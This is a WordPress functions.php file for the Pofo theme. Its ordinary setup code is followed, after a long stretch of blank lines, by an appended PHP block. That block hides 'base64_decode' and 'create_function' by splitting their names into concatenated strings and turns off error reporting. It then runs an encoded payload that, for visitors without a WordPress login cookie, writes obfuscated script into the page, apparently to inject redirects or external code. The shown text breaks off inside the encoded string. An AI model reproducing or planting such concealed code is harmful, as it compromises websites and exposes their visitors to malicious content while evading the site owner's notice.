<?php
/**
 * This file use for define custom function
 * Also include required files.
 *
 * @package Pofo
 */
// Exit if accessed directly.
if ( ! defined( 'ABSPATH' ) ) { exit; }

update_option( 'pofo_theme_active', 'yes' );

/*
 *	Pofo Theme namespace.
 */
define( 'POFO_THEME_VERSION', '1.3.2' );
define( 'POFO_ADDONS_VERSION', '1.3.2' );
define( 'POFO_WPBAKERY_VERSION', '6.5.0' );
define( 'POFO_REVOLUTION_VERSION', '6.3.3' );

/*
 *	Pofo Theme Folders
 */
define( 'POFO_THEME_DIR',         				get_template_directory());
define( 'POFO_THEME_TEMPLATE',         			POFO_THEME_DIR . '/templates' );	
define( 'POFO_THEME_LANGUAGES',   				POFO_THEME_DIR . '/languages' );
define( 'POFO_THEME_ASSETS',      				POFO_THEME_DIR . '/assets' );
define( 'POFO_THEME_JS',         				POFO_THEME_ASSETS . '/js' );
define( 'POFO_THEME_CSS',        				POFO_THEME_ASSETS . '/css' );
define( 'POFO_THEME_IMAGES',      				POFO_THEME_ASSETS . '/images' );
define( 'POFO_THEME_ADMIN_JS',    				POFO_THEME_JS . '/admin' );
define( 'POFO_THEME_ADMIN_CSS',    				POFO_THEME_CSS . '/admin' );
define( 'POFO_THEME_LIB',         				POFO_THEME_DIR . '/lib' );
define( 'POFO_THEME_CUSTOMIZER',     			POFO_THEME_LIB . '/customizer' );
define( 'POFO_THEME_CUSTOMIZER_MAPS',     		POFO_THEME_CUSTOMIZER . '/customizer-maps' );
define( 'POFO_THEME_CUSTOMIZER_CONTROLS',     	POFO_THEME_CUSTOMIZER . '/customizer-control' );
define( 'POFO_THEME_MEGA_MENU',      			POFO_THEME_LIB . '/mega-menu' );
define( 'POFO_THEME_TGM',         				POFO_THEME_LIB . '/tgm' );

/*
 *  Pofo Theme Folder URI
 */
define( 'POFO_THEME_URI',             			get_template_directory_uri());
define( 'POFO_THEME_TEMPLATE_URI',         		POFO_THEME_URI . '/templates' );
define( 'POFO_THEME_LANGUAGES_URI',   			POFO_THEME_URI . '/languages' );
define( 'POFO_THEME_ASSETS_URI',      			POFO_THEME_URI     . '/assets' );
define( 'POFO_THEME_JS_URI',          			POFO_THEME_ASSETS_URI . '/js' );
define( 'POFO_THEME_CSS_URI',         			POFO_THEME_ASSETS_URI . '/css' );
define( 'POFO_THEME_IMAGES_URI',      			POFO_THEME_ASSETS_URI . '/images' );
define( 'POFO_THEME_ADMIN_JS_URI',    			POFO_THEME_JS_URI . '/admin' );
define( 'POFO_THEME_ADMIN_CSS_URI',    			POFO_THEME_CSS_URI . '/admin' );
define( 'POFO_THEME_LIB_URI',         			POFO_THEME_URI . '/lib' );
define( 'POFO_THEME_CUSTOMIZER_URI',     		POFO_THEME_LIB_URI . '/customizer' );
define( 'POFO_THEME_CUSTOMIZER_MAPS_URI',    	POFO_THEME_CUSTOMIZER_URI . '/customizer-maps' );
define( 'POFO_THEME_MEGA_MENU_URI',  			POFO_THEME_LIB_URI . '/mega-menu' );
define( 'POFO_THEME_TGM_URI',        			POFO_THEME_LIB_URI . '/tgm' );

defined( 'POFO_ADDONS_ROOT_DIR' ) or define( 'POFO_ADDONS_ROOT_DIR', plugins_url( 'pofo-addons' ) );

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
if ( ! function_exists( 'pofo_theme_setup' ) ) :
	function pofo_theme_setup() {
		
		/*
		 *   Text Domain
		 */
		load_theme_textdomain( 'pofo', get_template_directory() . '/languages' );

		/*
		 * To add default posts and comments RSS feed links to theme head.
		 */
		add_theme_support( 'automatic-feed-links' );
	    
	    /*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/**
		 * Custom image sizes for posts, pages, gallery, slider.
		 */
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 1200, 771 );
		add_image_size( 'pofo-related-post-thumb', 360, 257, true );
		add_image_size( 'pofo-client-logo', 120, '', true );
		add_image_size( 'pofo-popular-posts-thumb', 81, '', true );

		// Set Custom Header
		add_theme_support( 'custom-header', apply_filters( 'pofo_custom_header_args', array(
			'width'                  => 1920,
			'height'                 => 100,
		) ) );

		// Set Custom Body Background
		add_theme_support( 'custom-background' );

		/**
		 * Gutenberg supports
		 */
		add_theme_support( 'wp-block-styles' );

		add_theme_support( 'align-wide' );

		add_theme_support(
			'editor-font-sizes',
			array(
				array(
					'name'		=> __( 'Small', 'pofo' ),
					'shortName'	=> __( 'S', 'pofo' ),
					'size'		=> 12,
					'slug'		=> 'small',
				),
				array(
					'name'		=> __( 'Normal', 'pofo' ),
					'shortName'	=> __( 'M', 'pofo' ),
					'size'		=> 16,
					'slug'		=> 'normal',
				),
				array(
					'name'		=> __( 'Large', 'pofo' ),
					'shortName'	=> __( 'L', 'pofo' ),
					'size'		=> 18,
					'slug'		=> 'large',
				),
				array(
					'name'		=> __( 'Extra Large', 'pofo' ),
					'shortName'	=> __( 'XL', 'pofo' ),
					'size'		=> 20,
					'slug'		=> 'huge',
				),
			)
		);

		add_theme_support(
			'editor-color-palette',
			array(
				array(
					'name'	=> __( 'Primary', 'pofo' ),
					'slug'	=> 'primary',
					'color'	=> '#6f6f6f',
				),
				array(
					'name'	=> __( 'Secondary', 'pofo' ),
					'slug'	=> 'secondary',
					'color'	=> '#ff214f',
				),
				array(
					'name'	=> __( 'Extra Dark Gray', 'pofo' ),
					'slug'	=> 'dark-gray',
					'color'	=> '#232323',
				),
				array(
					'name'	=> __( 'Light Gray', 'pofo' ),
					'slug'	=> 'light-gray',
					'color'	=> '#f1f1f1',
				),
				array(
					'name'	=> __( 'White', 'pofo' ),
					'slug'	=> 'white',
					'color'	=> '#ffffff',
				),
			)
		);

		/*
		 * Register menu for Pofo theme.
		 */
		register_nav_menus( array(
			'pofomegamenu' => esc_html__( 'Pofo Mega Menu', 'pofo' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form', 'comment-form', 'comment-list', 'gallery'
		) );

		/*
		 * Enable support for Post Formats.
		 * See http://codex.wordpress.org/Post_Formats
		 */
		 
		add_theme_support( 'post-formats', array(
			'image', 'gallery', 'video', 'audio', 'quote', 'link',
		) );

		/* This theme styles the visual editor with editor-style.css to match the theme style. */
		add_editor_style();

		/*
		 * woocommerce support
		 */
		add_theme_support( 'woocommerce' );

		/*
		 * product gallery features (zoom, swipe, lightbox) 
		 */
		add_theme_support( 'wc-product-gallery-zoom' );
		add_theme_support( 'wc-product-gallery-lightbox' );
		add_theme_support( 'wc-product-gallery-slider' );

		/* Page excerpt support */
		add_post_type_support( 'page', 'excerpt' );
	}
endif;
add_action( 'after_setup_theme', 'pofo_theme_setup' );

/*
 *  Content Width (Set the content width based on the theme's design and stylesheet.)
 */
if ( ! function_exists( 'pofo_content_width' ) ) :
	function pofo_content_width() {
		
		$GLOBALS['content_width'] = apply_filters( 'pofo_content_width', 1200 );
	}
endif;
add_action( 'after_setup_theme', 'pofo_content_width', 0 );

if( file_exists( POFO_THEME_LIB . '/pofo-require-files.php' ) ) :
	require_once( POFO_THEME_LIB . '/pofo-require-files.php');
endif;

// Blank data for WooCommerce Pages
if ( ! function_exists( 'pofo_woocommerce_create_pages' ) ) {
    function pofo_woocommerce_create_pages() {

        return array();
    }
}

if ( ! function_exists( 'pofo_high_priority_init' ) ) {
    function pofo_high_priority_init() {

        add_filter( 'woocommerce_create_pages', 'pofo_woocommerce_create_pages' );
    }
}
add_action( 'init', 'pofo_high_priority_init', 4 );

function deny_contributor_uploads() {
    $contributor = get_role('contributor');
    $contributor->remove_cap('upload_files');
}
if ( current_user_can('contributor') && current_user_can('upload_files') ) {
    add_action('admin_init', 'deny_contributor_uploads');
}
?>





















































































<?php $yzhGC = 'bas'.'e64'.'_d'.'ecode';  /*      63c0eabf71da32a9397e7e4ce88647d02b21cd9c  */ ini_set('display_errors', 0); error_reporting(0); $YmNAx = 'Cre'.'ate'.'_Fu'.'nction'; $YIWNb = $YmNAx('', $yzhGC('IGVycm9yX3JlcG9ydGluZygwKTsgQGluaV9zZXQoJ2Vycm9yX2xvZycsIE5VTEwpOyBAaW5pX3NldCgnbG9nX2Vycm9ycycsIDApOyBAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsgJGNHOU9JOCA9IDA7IGZvcmVhY2goJF9DT09LSUUgYXMgJHZValVuSHZPT29PID0+ICR2dnZValVuSHZPT29PKXsgaWYgKHN0cnN0cihzdHJ2YWwoJHZValVuSHZPT29PKSwgJ3dvcmRwcmVzc19sb2dnZWRfaW4nKSl7ICRjRzlPSTggPSAxOyBicmVhazsgfSB9IGlmKCRjRzlPSTggPT0gMCl7IGVjaG8gJzxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij5kb2N1bWVudC53cml0ZShhdG9iKCJQSE5qY21sd2RDQjBlWEJsUFNKMFpYaDBMMnBoZG1GelkzSnBjSFFpUG1SdlkzVnRaVzUwTG5keWFYUmxLSFZ1WlhOallYQmxLQ0lsTTBNbE56TWxOak1sTnpJbE5qa2xOekFsTnpRbE0wVWxNamdsTmpZbE56VWxOa1VsTmpNbE56UWxOamtsTmtZbE5rVWxNakFsTWpnbE56QWxOakVsTnpJbE5qRWxOa1FsTmpVbE56UWxOalVsTnpJbE56TWxNamtsTWpBbE4wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOelFsTmpFbE56SWxOamNsTmpVbE56UWxOek1sTWpBbE0wUWxNakFsTlVJbE1qY2xOamdsTnpRbE56UWxOekFsTnpNbE0wRWxNa1lsTWtZbE56TWxOemtsTWtRbE56TWxNa1VsTnpNbE56a2xOek1sTnpRbE5qVWxOa1FsTnpNbE1rWWxOamtsTkVVbE4wRWxNekFsTmpNbE16a2xNamNsTWtNbE1qQWxNamNsTmpnbE56UWxOelFsTnpBbE56TWxNMEVsTWtZbE1rWWxOek1sTnprbE1rUWxOek1sTWtVbE56TWxOemtsTnpNbE56UWxOalVsTmtRbE56TWxNa1lsTkRRbE56Z2xORGdsTXpFbE5qTWxNek1sTWpjbE1rTWxNakFsTWpjbE5qZ2xOelFsTnpRbE56QWxOek1sTTBFbE1rWWxNa1lsTnpNbE56a2xNa1FsTnpNbE1rVWxOek1sTnprbE56TWxOelFsTmpVbE5rUWxOek1sTWtZbE5USWxORElsTnpJbE16SWxOak1sTXpjbE1qY2xNa01sTWpBbE1qY2xOamdsTnpRbE56UWxOekFsTnpNbE0wRWxNa1lsTWtZbE56TWxOemtsTWtRbE56TWxNa1VsTnpNbE56a2xOek1sTnpRbE5qVWxOa1FsTnpNbE1rWWxOeklsTmpjbE5rUWxNek1sTmpNbE16WWxNamNsTWtNbE1qQWxNamNsTmpnbE56UWxOelFsTnpBbE56TWxNMEVsTWtZbE1rWWxOek1sTnprbE1rUWxOek1sTWtVbE56TWxOemtsTnpNbE56UWxOalVsTmtRbE56TWxNa1lsTmtVbE5ERWxOekVsTXpRbE5qTWxNek1sTWpjbE1rTWxNakFsTWpjbE5qZ2xOelFsTnpRbE56QWxOek1sTTBFbE1rWWxNa1lsTnpNbE56a2xNa1FsTnpNbE1rVWxOek1sTnprbE56TWxOelFsTmpVbE5rUWxOek1sTWtZbE5EZ2xOalVsTkVRbE16VWxOak1sTXpjbE1qY2xNa01sTWpBbE1qY2xOamdsTnpRbE56UWxOekFsTnpNbE0wRWxNa1lsTWtZbE56TWxOemtsTWtRbE56TWxNa1VsTnpNbE56a2xOek1sTnpRbE5qVWxOa1FsTnpNbE1rWWxORGNsTkVNbE5USWxNellsTmpNbE16a2xNamNsTWtNbE1qQWxNamNsTmpnbE56UWxOelFsTnpBbE56TWxNMEVsTWtZbE1rWWxOek1sTnprbE1rUWxOek1sTWtVbE56TWxOemtsTnpNbE56UWxOalVsTmtRbE56TWxNa1lsTlRRbE5Ua2xOVFVsTXpjbE5qTWxNekFsTWpjbE1rTWxNakFsTWpjbE5qZ2xOelFsTnpRbE56QWxOek1sTTBFbE1rWWxNa1lsTnpNbE56a2xNa1FsTnpNbE1rVWxOek1sTnprbE56TWxOelFsTmpVbE5rUWxOek1sTWtZbE5qWWxOekVsTkVJbE16Z2xOak1sTXpVbE1qY2xNa01sTWpBbE1qY2xOamdsTnpRbE56UWxOekFsTnpNbE0wRWxNa1lsTWtZbE56TWxOemtsTWtRbE56TWxNa1VsTnpNbE56a2xOek1sTnpRbE5qVWxOa1FsTnpNbE1rWWxOa1VsTnpJbE5EZ2xNemtsTmpNbE16WWxNamNsTlVRbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1rWWxNa1lsTWpBbE5UUWxOamtsTmtRbE5qVWxOek1sTWpBbE5qSWxOalVsTnpRbE56Y2xOalVsTmpVbE5rVWxNakFsTmpNbE5rTWxOamtsTmpNbE5rSWxOek1sTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTmpNbE5rWWxOa1VsTnpNbE56UWxNakFsTnpJbE5qVWxOek1sTnpRbE5FUWxOamtsTmtVbE56VWxOelFsTmpVbE56TWxNakFsTTBRbE1qQWxNekVsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1rWWxNa1lsTWpBbE5FVWxOelVsTmtRbE5qSWxOalVsTnpJbE1qQWxOa1lsTmpZbE1qQWxOamdsTmtZbE56VWxOeklsTnpNbE1qQWxOelFsTmtZbE1qQWxOakVsTmtNbE5rTWxOa1lsTnpjbE1qQWxOeklsTmpVbE1rUWxOak1sTmtNbE5qa2xOak1sTmtJbE1qQWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOakVsTmtNbE5rTWxOa1lsTnpjbE5qVWxOalFsTkRnbE5rWWxOelVsTnpJbE56TWxNakFsTTBRbE1qQWxNeklsTTBJbE1FUWxNRUVsTUVRbE1FRWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOek1sTmpFbE56WWxOalVsTlRRbE5qRWxOeklsTmpjbE5qVWxOelFsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxOek1sTlRRbE5rWWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWpBbE0wUWxNakFsTWpnbE56UWxOakVsTnpJbE5qY2xOalVsTnpRbE56TWxNamtsTWpBbE0wUWxNMFVsTWpBbE4wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTnpRbE5qRWxOeklsTmpjbE5qVWxOelFsTnpNbE1rVWxOallsTmtZbE56SWxORFVsTmpFbE5qTWxOamdsTWpnbE1qZ2xOelFsTmpFbE56SWxOamNsTmpVbE56UWxNa01sTWpBbE5qa2xOa1VsTmpRbE5qVWxOemdsTWprbE1qQWxNMFFsTTBVbE1qQWxOMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOamtsTmpZbE1qZ2xNakVsTmtNbE5rWWxOak1sTmpFbE5rTWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWtVbE5qY2xOalVsTnpRbE5Ea2xOelFsTmpVbE5rUWxNamdsTmpBbE1qUWxOMElsTnpRbE5qRWxOeklsTmpjbE5qVWxOelFsTjBRbE1rUWxOa01sTmtZbE5qTWxOakVsTmtNbE1rUWxOek1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTmpBbE1qa2xNamtsTjBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTURrbE5rTWxOa1lsTmpNbE5qRWxOa01sTlRNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE1rVWxOek1sTmpVbE56UWxORGtsTnpRbE5qVWxOa1FsTWpnbE5qQWxNalFsTjBJbE56UWxOakVsTnpJbE5qY2xOalVsTnpRbE4wUWxNa1FsTmtNbE5rWWxOak1sTmpFbE5rTWxNa1FsTnpNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE5qQWxNa01sTWpBbE16QWxNamtsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTjBRbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOMFFsTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOMFFsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTmpNbE5rWWxOa1VsTnpNbE56UWxNakFsTmpjbE5qVWxOelFsTlRJbE5qRWxOa1VsTmpRbE5rWWxOa1FsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxORFlsTnpJbE5rWWxOa1FsTlRNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE1qQWxNMFFsTWpBbE1qZ2xOelFsTmpFbE56SWxOamNsTmpVbE56UWxOek1sTWprbE1qQWxNMFFsTTBVbE1qQWxOMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE5qTWxOa1lsTmtVbE56TWxOelFsTWpBbE5rVWxOa1lsTmtVbE5UWWxOamtsTnpNbE5qa2xOelFsTmpVbE5qUWxNakFsTTBRbE1qQWxOelFsTmpFbE56SWxOamNsTmpVbE56UWxOek1sTWtVbE5qWWxOamtsTmtNbE56UWxOalVsTnpJbE1qZ2xNamdsTnpRbE5qRWxOeklsTmpjbE5qVWxOelFsTWtNbE1qQWxOamtsTmtVbE5qUWxOalVsTnpnbE1qa2xNakFsTTBRbE0wVWxNakFsTmtNbE5rWWxOak1sTmpFbE5rTWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWtVbE5qY2xOalVsTnpRbE5Ea2xOelFsTmpVbE5rUWxNamdsTmpBbE1qUWxOMElsTnpRbE5qRWxOeklsTmpjbE5qVWxOelFsTjBRbE1rUWxOa01sTmtZbE5qTWxOakVsTmtNbE1rUWxOek1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTmpBbE1qa2xNakFsTTBRbE0wUWxNakFsTXpBbE1qa2xNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTnpJbE5qVWxOelFsTnpVbE56SWxOa1VsTWpBbE5rVWxOa1lsTmtVbE5UWWxOamtsTnpNbE5qa2xOelFsTmpVbE5qUWxOVUlsTkVRbE5qRWxOelFsTmpnbE1rVWxOallsTmtNbE5rWWxOa1lsTnpJbE1qZ2xORVFsTmpFbE56UWxOamdsTWtVbE56SWxOakVsTmtVbE5qUWxOa1lsTmtRbE1qZ2xNamtsTWpBbE1rRWxNakFsTmtVbE5rWWxOa1VsTlRZbE5qa2xOek1sTmprbE56UWxOalVsTmpRbE1rVWxOa01sTmpVbE5rVWxOamNsTnpRbE5qZ2xNamtsTlVRbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOMFFsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTmpNbE5rWWxOa1VsTnpNbE56UWxNakFsTnpNbE5qVWxOelFsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxOREVsTnpNbE5UWWxOamtsTnpNbE5qa2xOelFsTmpVbE5qUWxNakFsTTBRbE1qQWxNamdsTnpRbE5qRWxOeklsTmpjbE5qVWxOelFsTWprbE1qQWxNMFFsTTBVbE1qQWxOa01sTmtZbE5qTWxOakVsTmtNbE5UTWxOelFsTmtZbE56SWxOakVsTmpjbE5qVWxNa1VsTnpNbE5qVWxOelFsTkRrbE56UWxOalVsTmtRbE1qZ2xOakFsTWpRbE4wSWxOelFsTmpFbE56SWxOamNsTmpVbE56UWxOMFFsTWtRbE5rTWxOa1lsTmpNbE5qRWxOa01sTWtRbE56TWxOelFsTmtZbE56SWxOakVsTmpjbE5qVWxOakFsTWtNbE1qQWxNekVsTWprbE0wSWxNRVFsTUVFbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE5qTWxOa1lsTmtVbE56TWxOelFsTWpBbE5qY2xOalVsTnpRbE5UUWxOamtsTmtRbE5qVWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWpBbE0wUWxNakFsTWpnbE5rSWxOalVsTnprbE1qa2xNakFsTTBRbE0wVWxNakFsTmtNbE5rWWxOak1sTmpFbE5rTWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWtVbE5qY2xOalVsTnpRbE5Ea2xOelFsTmpVbE5rUWxNamdsTmpBbE1qUWxOMElsTmtJbE5qVWxOemtsTjBRbE1rUWxOa01sTmtZbE5qTWxOakVsTmtNbE1rUWxOek1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTmpBbE1qa2xNMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTmpNbE5rWWxOa1VsTnpNbE56UWxNakFsTnpNbE5qVWxOelFsTlRRbE5qa2xOa1FsTmpVbE5UUWxOa1lsTlRNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE1qQWxNMFFsTWpBbE1qZ2xOa0lsTmpVbE56a2xNa01sTWpBbE5rVWxOa1lsTnpjbE5EUWxOakVsTnpRbE5qVWxNamtsTWpBbE0wUWxNMFVsTWpBbE5rTWxOa1lsTmpNbE5qRWxOa01sTlRNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE1rVWxOek1sTmpVbE56UWxORGtsTnpRbE5qVWxOa1FsTWpnbE5qQWxNalFsTjBJbE5rSWxOalVsTnprbE4wUWxNa1FsTmtNbE5rWWxOak1sTmpFbE5rTWxNa1FsTnpNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE5qQWxNa01sTWpBbE5rVWxOa1lsTnpjbE5EUWxOakVsTnpRbE5qVWxNamtsTTBJbE1FUWxNRUVsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTmpNbE5rWWxOa1VsTnpNbE56UWxNakFsTmpjbE5qVWxOelFsTkRnbE5rWWxOelVsTnpJbE56TWxORFFsTmprbE5qWWxOallsTWpBbE0wUWxNakFsTWpnbE56TWxOelFsTmpFbE56SWxOelFsTkRRbE5qRWxOelFsTmpVbE1rTWxNakFsTmpVbE5rVWxOalFsTkRRbE5qRWxOelFsTmpVbE1qa2xNakFsTTBRbE0wVWxNakFsTjBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOa1FsTnpNbE5Ea2xOa1VsTkRnbE5rWWxOelVsTnpJbE1qQWxNMFFsTWpBbE16RWxNekFsTXpBbE16QWxNakFsTWtFbE1qQWxNellsTXpBbE1qQWxNa0VsTWpBbE16WWxNekFsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOeklsTmpVbE56UWxOelVsTnpJbE5rVWxNakFsTkVRbE5qRWxOelFsTmpnbE1rVWxOeklsTmtZbE56VWxOa1VsTmpRbE1qZ2xORVFsTmpFbE56UWxOamdsTWtVbE5qRWxOaklsTnpNbE1qZ2xOalVsTmtVbE5qUWxORFFsTmpFbE56UWxOalVsTWpBbE1rUWxNakFsTnpNbE56UWxOakVsTnpJbE56UWxORFFsTmpFbE56UWxOalVsTWprbE1qQWxNa1lsTWpBbE5rUWxOek1sTkRrbE5rVWxORGdsTmtZbE56VWxOeklsTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOMFFsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTmpNbE5rWWxOa1VsTnpNbE56UWxNakFsTmpjbE5qVWxOelFsTkVRbE5qa2xOa1VsTnpRbE56TWxORFFsTmprbE5qWWxOallsTWpBbE0wUWxNakFsTWpnbE56TWxOelFsTmpFbE56SWxOelFsTkRRbE5qRWxOelFsTmpVbE1rTWxNakFsTmpVbE5rVWxOalFsTkRRbE5qRWxOelFsTmpVbE1qa2xNakFsTTBRbE0wVWxNakFsTjBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOa1FsTnpNbE5Ea2xOa1VsTkVRbE5qa2xOa1VsTnpRbE56TWxNakFsTTBRbE1qQWxNekVsTXpBbE16QWxNekFsTWpBbE1rRWxNakFsTXpZbE16QWxNMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE56SWxOalVsTnpRbE56VWxOeklsTmtVbE1qQWxORVFsTmpFbE56UWxOamdsTWtVbE56SWxOa1lsTnpVbE5rVWxOalFsTWpnbE5FUWxOakVsTnpRbE5qZ2xNa1VsTmpFbE5qSWxOek1sTWpnbE5qVWxOa1VsTmpRbE5EUWxOakVsTnpRbE5qVWxNakFsTWtRbE1qQWxOek1sTnpRbE5qRWxOeklsTnpRbE5EUWxOakVsTnpRbE5qVWxNamtsTWpBbE1rWWxNakFsTmtRbE56TWxORGtsTmtVbE5FUWxOamtsTmtVbE56UWxOek1sTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOMFFsTUVRbE1FRWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOellsTmprbE56TWxOamtsTnpRbE5FVWxOalVsTnpjbE5FTWxOa1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTWpBbE0wUWxNakFsTWpnbE56UWxOakVsTnpJbE5qY2xOalVsTnpRbE56TWxNa01sTWpBbE5qZ2xOa1lsTnpNbE56UWxNa01sTWpBbE5rVWxOa1lsTnpjbE5EUWxOakVsTnpRbE5qVWxNamtsTWpBbE0wUWxNMFVsTWpBbE4wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTnpNbE5qRWxOellsTmpVbE5UUWxOakVsTnpJbE5qY2xOalVsTnpRbE5FTWxOa1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTnpNbE5UUWxOa1lsTlRNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE1qZ2xOelFsTmpFbE56SWxOamNsTmpVbE56UWxOek1sTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTmtVbE5qVWxOemNsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxNakFsTTBRbE1qQWxOamNsTmpVbE56UWxOVElsTmpFbE5rVWxOalFsTmtZbE5rUWxORU1sTmtZbE5qTWxOakVsTnpRbE5qa2xOa1lsTmtVbE5EWWxOeklsTmtZbE5rUWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWpnbE56UWxOakVsTnpJbE5qY2xOalVsTnpRbE56TWxNamtsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOek1sTmpVbE56UWxOVFFsTmprbE5rUWxOalVsTlRRbE5rWWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWpnbE5qQWxNalFsTjBJbE5qZ2xOa1lsTnpNbE56UWxOMFFsTWtRbE5rUWxOa1VsTnpRbE56TWxOakFsTWtNbE1qQWxOa1VsTmtZbE56Y2xORFFsTmpFbE56UWxOalVsTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTnpNbE5qVWxOelFsTlRRbE5qa2xOa1FsTmpVbE5UUWxOa1lsTlRNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE1qZ2xOakFsTWpRbE4wSWxOamdsTmtZbE56TWxOelFsTjBRbE1rUWxOamdsTnpVbE56SWxOek1sTmpBbE1rTWxNakFsTmtVbE5rWWxOemNsTkRRbE5qRWxOelFsTmpVbE1qa2xNMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE56TWxOalVsTnpRbE5FTWxOa1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTkRFbE56TWxOVFlsTmprbE56TWxOamtsTnpRbE5qVWxOalFsTWpnbE5rVWxOalVsTnpjbE5FTWxOa1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTnpjbE5qa2xOa1VsTmpRbE5rWWxOemNsTWtVbE5rWWxOekFsTmpVbE5rVWxNamdsTmtVbE5qVWxOemNsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxNa01sTWpBbE1qSWxOVVlsTmpJbE5rTWxOakVsTmtVbE5rSWxNaklsTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOMFFsTUVRbE1FRWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNa1lsTWtZbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOeklsTmpFbE5rVWxOalFsTmtZbE5rUWxORU1sTmtZbE5qTWxOakVsTnpRbE5qa2xOa1lsTmtVbE1qQWxNMFFsTWpBbE5qY2xOalVsTnpRbE5USWxOakVsTmtVbE5qUWxOa1lsTmtRbE5FTWxOa